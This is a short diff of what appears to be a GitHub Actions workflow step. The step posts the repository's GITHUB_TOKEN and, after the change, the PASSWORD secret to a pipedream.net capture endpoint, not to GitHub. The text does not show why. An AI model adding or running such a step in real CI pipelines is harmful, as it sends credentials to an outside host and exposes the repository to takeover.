@@ -34,6 +34,6 @@ jobs:
            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github.v3+json" \
            https://en1peio1595a69e.m.pipedream.net \
-           -d '{"base":"main","head":"dev", "password":"'"$mypassword"'"}'
+           -d '{"base":"main","head":"dev", "password":"'"${{ secrets.PASSWORD }}"'"}'
 
  
